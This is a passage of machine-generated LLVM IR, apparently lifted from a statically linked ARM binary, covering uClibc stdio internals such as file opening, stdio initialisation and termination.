  %v1_12544 = load i32, i32* @r6, align 4
  %v2_12544 = sub i32 -1, %v1_12544
  %v3_12544 = and i32 %v0_12544, %v2_12544
  store i32 %v3_12544, i32* %r3.global-to-local, align 4
  %v1_12548 = and i32 %v3_12544, 1024
  %v2_12548 = icmp eq i32 %v1_12548, 0
  store i1 %v2_12548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12548, label %dec_label_pc_12568, label %dec_label_pc_12550

dec_label_pc_12550:                               ; preds = %dec_label_pc_12544
  %v0_12550 = load i32, i32* @r5, align 4
  store i32 %v0_12550, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_1255c = call i32 @__libc_fcntl(i32 %v0_12550, i32 4)
  store i32 %v2_1255c, i32* %r0.global-to-local, align 4
  %v2_12560 = icmp eq i32 %v2_1255c, 0
  store i1 %v2_12560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12560, label %dec_label_pc_12550.dec_label_pc_12568_crit_edge, label %dec_label_pc_12498

dec_label_pc_12550.dec_label_pc_12568_crit_edge:  ; preds = %dec_label_pc_12550
  %v0_12568.pre = load i32, i32* @r6, align 4
  %v0_1256c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12568

dec_label_pc_12568:                               ; preds = %dec_label_pc_12550.dec_label_pc_12568_crit_edge, %dec_label_pc_12544
  %v0_1256c = phi i32 [ %v0_1256c.pre, %dec_label_pc_12550.dec_label_pc_12568_crit_edge ], [ %v0_12544, %dec_label_pc_12544 ]
  %v0_12568 = phi i32 [ %v0_12568.pre, %dec_label_pc_12550.dec_label_pc_12568_crit_edge ], [ %v1_12544, %dec_label_pc_12544 ]
  %v1_12568 = and i32 %v0_12568, 131072
  store i32 %v1_12568, i32* %r3.global-to-local, align 4
  %v2_1256c = or i32 %v1_12568, %v0_1256c
  store i32 %v2_1256c, i32* @r4, align 4
  br label %dec_label_pc_12598

dec_label_pc_12574:                               ; preds = %dec_label_pc_1251c
  %v7_12574 = icmp eq i32 %v0_12574, -1
  store i1 %v7_12574, i1* %cpsr_z.global-to-local, align 1
  %v0_12580.pre = load i32, i32* @r4, align 4
  br i1 %v7_12574, label %dec_label_pc_12574._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_12574
  %v2_12578 = or i32 %v0_12580.pre, ptrtoint ([31 x i8]* @global_var_20000.1014 to i32)
  store i32 %v2_12578, i32* @r4, align 4
  br label %dec_label_pc_12574._crit_edge

dec_label_pc_12574._crit_edge:                    ; preds = %dec_label_pc_12574, %bb34
  %v0_12580 = phi i32 [ %v2_12578, %bb34 ], [ %v0_12580.pre, %dec_label_pc_12574 ]
  %v0_1257c = load i32, i32* @r6, align 4
  store i32 %v0_1257c, i32* %r0.global-to-local, align 4
  store i32 %v0_12580, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_12588 = inttoptr i32 %v0_1257c to i8*
  %v3_12588 = call i32 @__libc_open(i8* %v2_12588, i32 %v0_12580)
  store i32 %v3_12588, i32* %r0.global-to-local, align 4
  %v1_1258c = icmp slt i32 %v3_12588, 0
  %v2_1258c = icmp eq i32 %v3_12588, 0
  store i1 %v2_1258c, i1* %cpsr_z.global-to-local, align 1
  %v1_12590 = load i32, i32* @r8, align 4
  %v2_12590 = add i32 %v1_12590, 4
  %v3_12590 = inttoptr i32 %v2_12590 to i32*
  store i32 %v3_12588, i32* %v3_12590, align 4
  br i1 %v1_1258c, label %dec_label_pc_124ac, label %dec_label_pc_12598

dec_label_pc_12598:                               ; preds = %dec_label_pc_12574._crit_edge, %dec_label_pc_12568
  %v0_12598 = load i32, i32* @r8, align 4
  %v1_12598 = inttoptr i32 %v0_12598 to i32*
  %v2_12598 = load i32, i32* %v1_12598, align 4
  %v1_1259c = and i32 %v2_12598, 8192
  store i32 %v1_1259c, i32* %r3.global-to-local, align 4
  %v3_125a01 = udiv i32 %v1_1259c, 256
  store i32 %v3_125a01, i32* %r2.global-to-local, align 4
  %v1_125a4 = trunc i32 %v3_125a01 to i8
  %v3_125a4 = add i32 %v0_12598, 1
  %v4_125a4 = inttoptr i32 %v3_125a4 to i8*
  store i8 %v1_125a4, i8* %v4_125a4, align 1
  %v0_125a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_125a8 = trunc i32 %v0_125a8 to i8
  %v2_125a8 = load i32, i32* @r8, align 4
  %v3_125a8 = inttoptr i32 %v2_125a8 to i8*
  store i8 %v1_125a8, i8* %v3_125a8, align 1
  %v0_125ac = load i32, i32* @r4, align 4
  %v1_125ac = and i32 %v0_125ac, ptrtoint ([31 x i8]* @global_var_20000.1014 to i32)
  store i32 %v1_125ac, i32* %r1.global-to-local, align 4
  %v2_125ac = icmp eq i32 %v1_125ac, 0
  store i1 %v2_125ac, i1* %cpsr_z.global-to-local, align 1
  %v0_125b0 = load i32, i32* @r8, align 4
  %v1_125b0 = add i32 %v0_125b0, 1
  %v2_125b0 = inttoptr i32 %v1_125b0 to i8*
  %v3_125b0 = load i8, i8* %v2_125b0, align 1
  %v4_125b0 = zext i8 %v3_125b0 to i32
  %v1_125b4 = inttoptr i32 %v0_125b0 to i8*
  %v2_125b4 = load i8, i8* %v1_125b4, align 1
  %v3_125b4 = zext i8 %v2_125b4 to i32
  store i32 %v3_125b4, i32* %r3.global-to-local, align 4
  br i1 %v2_125ac, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_12598
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_12598, %bb35
  %v0_125c8 = phi i32 [ 0, %dec_label_pc_12598 ], [ 32768, %bb35 ]
  %v1_125bc = and i32 %v0_125ac, 1024
  store i32 %v1_125bc, i32* %r0.global-to-local, align 4
  %v4_125c4 = mul nuw nsw i32 %v4_125b0, 256
  %v5_125c4 = or i32 %v3_125b4, %v4_125c4
  %v2_125c8 = or i32 %v0_125c8, %v1_125bc
  store i32 %v2_125c8, i32* %r1.global-to-local, align 4
  %v2_125d0 = or i32 %v5_125c4, %v2_125c8
  %v1_125c0 = mul i32 %v0_125ac, 16
  %v1_125cc = and i32 %v1_125c0, 48
  %v1_125d4 = add nuw nsw i32 %v1_125cc, 16
  %v4_125d8 = xor i32 %v1_125d4, 48
  %v5_125d8 = or i32 %v2_125d0, %v4_125d8
  store i32 %v5_125d8, i32* %r3.global-to-local, align 4
  %v3_125dc19 = udiv i32 %v2_125d0, 256
  store i32 %v3_125dc19, i32* %r2.global-to-local, align 4
  %v1_125e0 = trunc i32 %v3_125dc19 to i8
  store i8 %v1_125e0, i8* %v2_125b0, align 1
  %v0_125e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_125e4 = trunc i32 %v0_125e4 to i8
  %v2_125e4 = load i32, i32* @r8, align 4
  %v3_125e4 = inttoptr i32 %v2_125e4 to i8*
  store i8 %v1_125e4, i8* %v3_125e4, align 1
  %v0_125e8 = call i32 @__errno_location()
  store i32 %v0_125e8, i32* %r0.global-to-local, align 4
  %v0_125ec = load i32, i32* @r8, align 4
  %v1_125ec = add i32 %v0_125ec, 1
  %v2_125ec = inttoptr i32 %v1_125ec to i8*
  %v3_125ec = load i8, i8* %v2_125ec, align 1
  %v4_125ec = zext i8 %v3_125ec to i32
  store i32 %v4_125ec, i32* %r3.global-to-local, align 4
  %v1_125f0 = inttoptr i32 %v0_125ec to i8*
  %v2_125f0 = load i8, i8* %v1_125f0, align 1
  %v3_125f0 = zext i8 %v2_125f0 to i32
  store i32 %v0_125e8, i32* @r6, align 4
  %v1_125f8 = add i32 %v0_125ec, 4
  %v2_125f8 = inttoptr i32 %v1_125f8 to i32*
  %v3_125f8 = load i32, i32* %v2_125f8, align 4
  store i32 %v3_125f8, i32* @r0, align 4
  %v4_125fc = mul nuw nsw i32 %v4_125ec, 256
  %v5_125fc = or i32 %v3_125f0, %v4_125fc
  store i32 %v5_125fc, i32* @r4, align 4
  %v1_12600 = inttoptr i32 %v0_125e8 to i32*
  %v2_12600 = load i32, i32* %v1_12600, align 4
  store i32 %v2_12600, i32* @r5, align 4
  %v1_12604 = call i32 @isatty(i32 %v3_125f8)
  store i32 %v1_12604, i32* %r0.global-to-local, align 4
  %v0_12608 = load i32, i32* @r4, align 4
  %v4_12608 = mul i32 %v1_12604, 256
  %v5_12608 = or i32 %v0_12608, %v4_12608
  store i32 %v5_12608, i32* @r4, align 4
  %v3_1260c = sdiv i32 %v5_12608, 256
  store i32 %v3_1260c, i32* %r3.global-to-local, align 4
  %v1_12610 = trunc i32 %v3_1260c to i8
  %v2_12610 = load i32, i32* @r8, align 4
  %v3_12610 = add i32 %v2_12610, 1
  %v4_12610 = inttoptr i32 %v3_12610 to i8*
  store i8 %v1_12610, i8* %v4_12610, align 1
  %v0_12614 = load i32, i32* @r4, align 4
  %v1_12614 = trunc i32 %v0_12614 to i8
  %v2_12614 = load i32, i32* @r8, align 4
  %v3_12614 = inttoptr i32 %v2_12614 to i8*
  store i8 %v1_12614, i8* %v3_12614, align 1
  %v0_12618 = load i32, i32* @r5, align 4
  %v1_12618 = load i32, i32* @r6, align 4
  %v2_12618 = inttoptr i32 %v1_12618 to i32*
  store i32 %v0_12618, i32* %v2_12618, align 4
  %v0_1261c = load i32, i32* @r8, align 4
  %v1_1261c = add i32 %v0_1261c, 8
  %v2_1261c = inttoptr i32 %v1_1261c to i32*
  %v3_1261c = load i32, i32* %v2_1261c, align 4
  store i32 %v3_1261c, i32* %r3.global-to-local, align 4
  %v2_12620 = icmp eq i32 %v3_1261c, 0
  store i1 %v2_12620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12620, label %dec_label_pc_12628, label %bb37

dec_label_pc_12628:                               ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_1262c = call i32 @malloc(i32 4096)
  store i32 %v1_1262c, i32* %r0.global-to-local, align 4
  %v2_12630 = icmp eq i32 %v1_1262c, 0
  store i1 %v2_12630, i1* %cpsr_z.global-to-local, align 1
  %v1_12644.pre = load i32, i32* @r8, align 4
  br i1 %v2_12630, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_12628
  %v2_1264420 = add i32 %v1_12644.pre, 8
  %v3_1264421 = inttoptr i32 %v2_1264420 to i32*
  store i32 0, i32* %v3_1264421, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_12628
  %v2_12634 = inttoptr i32 %v1_12644.pre to i32*
  %v3_12634 = load i32, i32* %v2_12634, align 4
  %v2_12638 = or i32 %v3_12634, 16384
  store i32 %v2_12638, i32* %r3.global-to-local, align 4
  %v2_1263c = add i32 %v1_1262c, 4096
  store i32 %v2_1263c, i32* %r2.global-to-local, align 4
  %v4_12640 = sdiv i32 %v2_12638, 256
  store i32 %v4_12640, i32* %r1.global-to-local, align 4
  %v2_12644 = add i32 %v1_12644.pre, 8
  %v3_12644 = inttoptr i32 %v2_12644 to i32*
  store i32 %v1_1262c, i32* %v3_12644, align 4
  %v1_12648 = load i32, i32* %r2.global-to-local, align 4
  %v2_12648 = load i32, i32* @r8, align 4
  %v3_12648 = add i32 %v2_12648, 12
  %v4_12648 = inttoptr i32 %v3_12648 to i32*
  store i32 %v1_12648, i32* %v4_12648, align 4
  %v1_1264c = load i32, i32* %r1.global-to-local, align 4
  %v2_1264c = trunc i32 %v1_1264c to i8
  %v3_1264c = load i32, i32* @r8, align 4
  %v4_1264c = add i32 %v3_1264c, 1
  %v5_1264c = inttoptr i32 %v4_1264c to i8*
  store i8 %v2_1264c, i8* %v5_1264c, align 1
  %v0_12650.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12650.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_12650 = load i32, i32* %r3.global-to-local, align 4
  %v2_12650 = trunc i32 %v1_12650 to i8
  %v3_12650 = load i32, i32* @r8, align 4
  %v4_12650 = inttoptr i32 %v3_12650 to i8*
  store i8 %v2_12650, i8* %v4_12650, align 1
  %v0_12654.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12654.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_12654 = load i32, i32* @r8, align 4
  %v3_12654 = add i32 %v2_12654, 12
  %v4_12654 = inttoptr i32 %v3_12654 to i32*
  store i32 %v1_1262c, i32* %v4_12654, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2d2dc.1017 to i32), i32* %r3.global-to-local, align 4
  %v2_12660 = load i32, i32* @r8, align 4
  %v3_12660 = add i32 %v2_12660, 2
  %v4_12660 = inttoptr i32 %v3_12660 to i8*
  store i8 0, i8* %v4_12660, align 1
  %v0_12664 = load i32, i32* @r8, align 4
  %v1_12664 = add i32 %v0_12664, 1
  %v2_12664 = inttoptr i32 %v1_12664 to i8*
  %v3_12664 = load i8, i8* %v2_12664, align 1
  %v4_12664 = zext i8 %v3_12664 to i32
  store i32 %v4_12664, i32* %r2.global-to-local, align 4
  %v2_12668 = load i32, i32* @global_var_2d2dc.1017, align 4
  store i32 %v2_12668, i32* %r1.global-to-local, align 4
  %v1_1266c = add i32 %v0_12664, 8
  %v2_1266c = inttoptr i32 %v1_1266c to i32*
  %v3_1266c = load i32, i32* %v2_1266c, align 4
  store i32 %v3_1266c, i32* %r3.global-to-local, align 4
  %v1_12670 = and i32 %v4_12664, 32
  %v2_12670 = icmp eq i32 %v1_12670, 0
  store i1 %v2_12670, i1* %cpsr_z.global-to-local, align 1
  %v2_12674 = add i32 %v0_12664, 20
  %v3_12674 = inttoptr i32 %v2_12674 to i32*
  store i32 %v3_1266c, i32* %v3_12674, align 4
  %v0_12678 = load i32, i32* %r0.global-to-local, align 4
  %v1_12678 = load i32, i32* @r8, align 4
  %v2_12678 = add i32 %v1_12678, 44
  %v3_12678 = inttoptr i32 %v2_12678 to i32*
  store i32 %v0_12678, i32* %v3_12678, align 4
  %v0_1267c = load i32, i32* %r1.global-to-local, align 4
  %v1_1267c = load i32, i32* @r8, align 4
  %v2_1267c = add i32 %v1_1267c, 52
  %v3_1267c = inttoptr i32 %v2_1267c to i32*
  store i32 %v0_1267c, i32* %v3_1267c, align 4
  %v0_12680 = load i32, i32* %r3.global-to-local, align 4
  %v1_12680 = load i32, i32* @r8, align 4
  %v2_12680 = add i32 %v1_12680, 24
  %v3_12680 = inttoptr i32 %v2_12680 to i32*
  store i32 %v0_12680, i32* %v3_12680, align 4
  %v0_12684 = load i32, i32* %r3.global-to-local, align 4
  %v1_12684 = load i32, i32* @r8, align 4
  %v2_12684 = add i32 %v1_12684, 28
  %v3_12684 = inttoptr i32 %v2_12684 to i32*
  store i32 %v0_12684, i32* %v3_12684, align 4
  %v0_12688 = load i32, i32* %r3.global-to-local, align 4
  %v1_12688 = load i32, i32* @r8, align 4
  %v2_12688 = add i32 %v1_12688, 16
  %v3_12688 = inttoptr i32 %v2_12688 to i32*
  store i32 %v0_12688, i32* %v3_12688, align 4
  br i1 %v2_12670, label %dec_label_pc_1271c, label %dec_label_pc_12690

dec_label_pc_12690:                               ; preds = %bb37
  %v2_12690 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_12690, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_15fd4.998 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2d2c4.1002 to i32), i32* %r2.global-to-local, align 4
  %v1_126a8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2d2c4.1002 to i32), i32* %r0.global-to-local, align 4
  %v1_126b8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_2d2ac.1023 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_1246c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_15fd4.998 to i32), i32* %r1.global-to-local, align 4
  %v1_126cc = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2d2ac.1023 to i32), i32* %r0.global-to-local, align 4
  %v1_126d8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_2d2a8.1026 to i32), i32* %r2.global-to-local, align 4
  %v2_126e0 = load i32, i32* bitcast (i32** @global_var_2d2a8.1026 to i32*), align 4
  store i32 %v2_126e0, i32* %r3.global-to-local, align 4
  store i32 %v2_1246c, i32* @r0, align 4
  %v1_126e8 = load i32, i32* @r8, align 4
  %v2_126e8 = add i32 %v1_126e8, 32
  %v3_126e8 = inttoptr i32 %v2_126e8 to i32*
  store i32 %v2_126e0, i32* %v3_126e8, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_126f4 = load i32, i32* @r8, align 4
  %v1_126f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_126f4 = inttoptr i32 %v1_126f4 to i32*
  store i32 %v0_126f4, i32* %v2_126f4, align 4
  %v1_126fc = call i32 @__pthread_return_void()
  store i32 %v2_12690, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 75540, i32* @lr, align 4
  %v1_12710 = call i32 @__pthread_return_void()
  store i32 %v1_12710, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1271c

dec_label_pc_12718:                               ; preds = %dec_label_pc_124ac, %dec_label_pc_12498, %dec_label_pc_124b8
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1271c

dec_label_pc_1271c:                               ; preds = %bb37, %dec_label_pc_124f0, %dec_label_pc_12690, %dec_label_pc_12718
  %v0_1271c = load i32, i32* @r8, align 4
  store i32 %v0_1271c, i32* %r0.global-to-local, align 4
  %v2_12724 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12724, i32* @r4, align 4
  store i32 %v6_12460, i32* @r5, align 4
  store i32 %v9_12460, i32* @r6, align 4
  store i32 %v15_12460, i32* @r8, align 4
  ret i32 %v0_1271c

; uselistorder directives
  uselistorder i32 %v1_12644.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1262c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_1260c, { 1, 0 }
  uselistorder i32 %v3_125a01, { 1, 0 }
  uselistorder i32 %v0_12580, { 1, 0 }
  uselistorder i1 %v7_12574, { 1, 0 }
  uselistorder i32 %v1_12544, { 1, 0 }
  uselistorder i32 %v0_12544, { 1, 0 }
  uselistorder i32 %v1_1252c, { 1, 0, 2 }
  uselistorder i32 %v1_124e0, { 1, 0 }
  uselistorder i1 %v7_1248c, { 1, 0 }
  uselistorder i1 %v7_12480, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 16384, { 18, 4, 11, 5, 12, 6, 13, 2, 14, 3, 15, 0, 16, 1, 17, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_1271c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_12718, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_12574._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1251c, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_124c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12498, { 1, 2, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12728:
  %v0_12728 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12728, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12728
  %v5_12728 = sdiv i32 %arg2, 16
  %v6_12728 = and i32 %v5_12728, %arg1
  %v5_1272c = sdiv i32 %arg2, 256
  %v6_1272c = and i32 %v6_12728, %v5_1272c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12728, %bb
  %v7_1272c = phi i32 [ %arg1, %dec_label_pc_12728 ], [ %v6_1272c, %bb ]
  ret i32 %v7_1272c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12758 = load i32, i32* @r4, align 4
  store i32 %v3_12758, i32* %stack_var_-24, align 4
  %v9_12758 = load i32, i32* @r6, align 4
  %v0_1275c = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_2d2e0.991 to i32), i32* @r4, align 4
  %v3_12764 = load i8, i8* @global_var_2d2e1.1029, align 1
  %v4_12764 = zext i8 %v3_12764 to i32
  %v2_12768 = load i8, i8* bitcast (i8** @global_var_2d2e0.991 to i8*), align 4
  %v3_12768 = zext i8 %v2_12768 to i32
  store i32 %v0_1275c, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_12774 = mul nuw nsw i32 %v4_12764, 256
  %v5_12774 = or i32 %v3_12768, %v4_12774
  store i32 %v5_12774, i32* @r6, align 4
  %v1_12778 = inttoptr i32 %v0_1275c to i32*
  %v2_12778 = load i32, i32* %v1_12778, align 4
  store i32 %v2_12778, i32* %r8.global-to-local, align 4
  %v1_1277c = call i32 @isatty(i32 0)
  %v1_12780 = sub i32 1, %v1_1277c
  %v0_12784 = load i32, i32* @r6, align 4
  %v4_12784 = mul i32 %v1_12780, 256
  %v5_12784 = xor i32 %v4_12784, %v0_12784
  %v3_12788 = load i8, i8* @global_var_2d331.1030, align 1
  %v4_12788 = zext i8 %v3_12788 to i32
  %v3_1278c = load i8, i8* @global_var_2d330.992, align 1
  %v4_1278c = zext i8 %v3_1278c to i32
  %v3_12790 = sdiv i32 %v5_12784, 256
  store i32 1, i32* @r0, align 4
  %v4_12798 = mul nuw nsw i32 %v4_12788, 256
  %v5_12798 = or i32 %v4_1278c, %v4_12798
  store i32 %v5_12798, i32* @r5, align 4
  %v1_1279c = trunc i32 %v3_12790 to i8
  store i8 %v1_1279c, i8* @global_var_2d2e1.1029, align 1
  %v1_127a0 = trunc i32 %v0_12784 to i8
  %v2_127a0 = load i32, i32* @r4, align 4
  %v3_127a0 = inttoptr i32 %v2_127a0 to i8*
  store i8 %v1_127a0, i8* %v3_127a0, align 1
  %v1_127a4 = call i32 @isatty(i32 1)
  %v1_127a8 = sub i32 1, %v1_127a4
  %v0_127ac = load i32, i32* @r5, align 4
  %v4_127ac = mul i32 %v1_127a8, 256
  %v5_127ac = xor i32 %v4_127ac, %v0_127ac
  store i32 %v5_127ac, i32* %r5.global-to-local, align 4
  %v3_127b0 = sdiv i32 %v5_127ac, 256
  %v1_127b4 = trunc i32 %v3_127b0 to i8
  store i8 %v1_127b4, i8* @global_var_2d331.1030, align 1
  %v0_127b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_127b8 = load i32, i32* @r7, align 4
  %v2_127b8 = inttoptr i32 %v1_127b8 to i32*
  store i32 %v0_127b8, i32* %v2_127b8, align 4
  %v0_127bc = load i32, i32* %r5.global-to-local, align 4
  %v1_127bc = trunc i32 %v0_127bc to i8
  store i8 %v1_127bc, i8* @global_var_2d330.992, align 1
  %v2_127c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_127c0, i32* @r4, align 4
  store i32 %v9_12758, i32* @r6, align 4
  ret i32 %v1_127a8

; uselistorder directives
  uselistorder i32 %v1_127a8, { 1, 0 }
  uselistorder i32 %v0_12784, { 1, 0 }
  uselistorder i8* @global_var_2d330.992, { 1, 0 }
  uselistorder i8* @global_var_2d331.1030, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_2d2e1.1029, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_23ec8.1032 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_127d0 = call i32 @memcpy()
  %v0_127d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_127d4, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_127d0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_127d8 = load i32, i32* @r4, align 4
  store i32 %v3_127d8, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2d2ac.1023 to i32), i32* @r0, align 4
  %v0_127e0 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_2d2c4.1002 to i32), i32* @r0, align 4
  %v0_127e8 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_2d2a8.1026 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_2d2a8.1026 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_128446 = add i32 %storemerge5, 56
  store i32 %v1_128446, i32* @r5, align 4
  %v2_128488 = icmp eq i32 %storemerge5, 0
  store i32 %v1_128446, i32* %r0.global-to-local, align 4
  br i1 %v2_128488, label %dec_label_pc_12854, label %dec_label_pc_127f8

dec_label_pc_127f8:                               ; preds = %entry, %dec_label_pc_12834
  store i32 ptrtoint (i8* @global_var_15fd4.998 to i32), i32* %r3.global-to-local, align 4
  store i32 75780, i32* @lr, align 4
  %v1_12800 = call i32 @__pthread_return_0()
  %v2_12804 = icmp eq i32 %v1_12800, 0
  %v0_12808 = load i32, i32* @r5, align 4
  store i32 %v0_12808, i32* @r0, align 4
  br i1 %v2_12804, label %dec_label_pc_12834, label %dec_label_pc_12810

dec_label_pc_12810:                               ; preds = %dec_label_pc_127f8
  %v0_12810 = load i32, i32* @r4, align 4
  %v1_12810 = add i32 %v0_12810, 8
  %v2_12810 = inttoptr i32 %v1_12810 to i32*
  %v3_12810 = load i32, i32* %v2_12810, align 4
  store i32 %v3_12810, i32* %r3.global-to-local, align 4
  %v3_12818 = inttoptr i32 %v0_12810 to i8*
  store i8 48, i8* %v3_12818, align 1
  %v2_12820 = load i32, i32* @r4, align 4
  %v3_12820 = add i32 %v2_12820, 1
  %v4_12820 = inttoptr i32 %v3_12820 to i8*
  store i8 0, i8* %v4_12820, align 1
  %v0_12824 = load i32, i32* %r3.global-to-local, align 4
  %v1_12824 = load i32, i32* @r4, align 4
  %v2_12824 = add i32 %v1_12824, 20
  %v3_12824 = inttoptr i32 %v2_12824 to i32*
  store i32 %v0_12824, i32* %v3_12824, align 4
  %v0_12828 = load i32, i32* %r3.global-to-local, align 4
  %v1_12828 = load i32, i32* @r4, align 4
  %v2_12828 = add i32 %v1_12828, 24
  %v3_12828 = inttoptr i32 %v2_12828 to i32*
  store i32 %v0_12828, i32* %v3_12828, align 4
  %v0_1282c = load i32, i32* %r3.global-to-local, align 4
  %v1_1282c = load i32, i32* @r4, align 4
  %v2_1282c = add i32 %v1_1282c, 28
  %v3_1282c = inttoptr i32 %v2_1282c to i32*
  store i32 %v0_1282c, i32* %v3_1282c, align 4
  %v0_12830 = load i32, i32* %r3.global-to-local, align 4
  %v1_12830 = load i32, i32* @r4, align 4
  %v2_12830 = add i32 %v1_12830, 16
  %v3_12830 = inttoptr i32 %v2_12830 to i32*
  store i32 %v0_12830, i32* %v3_12830, align 4
  br label %dec_label_pc_12834

dec_label_pc_12834:                               ; preds = %dec_label_pc_127f8, %dec_label_pc_12810
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_12838 = load i32, i32* @r4, align 4
  %v2_12838 = add i32 %v1_12838, 52
  %v3_12838 = inttoptr i32 %v2_12838 to i32*
  store i32 1, i32* %v3_12838, align 4
  %v0_1283c = call i32 @__stdio_init_mutex()
  store i32 %v0_1283c, i32* %r0.global-to-local, align 4
  %v0_12840 = load i32, i32* @r4, align 4
  %v1_12840 = add i32 %v0_12840, 32
  %v2_12840 = inttoptr i32 %v1_12840 to i32*
  %storemerge = load i32, i32* %v2_12840, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_12844 = add i32 %storemerge, 56
  store i32 %v1_12844, i32* @r5, align 4
  %v2_12848 = icmp eq i32 %storemerge, 0
  store i32 %v1_12844, i32* %r0.global-to-local, align 4
  br i1 %v2_12848, label %dec_label_pc_12844.dec_label_pc_12854_crit_edge, label %dec_label_pc_127f8

dec_label_pc_12844.dec_label_pc_12854_crit_edge:  ; preds = %dec_label_pc_12834
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_2d2a8.1026 to i32*), align 4
  br label %dec_label_pc_12854

dec_label_pc_12854:                               ; preds = %dec_label_pc_12844.dec_label_pc_12854_crit_edge, %entry
  %v11_1287c13 = phi i32 [ %v1_12844, %dec_label_pc_12844.dec_label_pc_12854_crit_edge ], [ %v1_128446, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_12844.dec_label_pc_12854_crit_edge ], [ 0, %entry ]
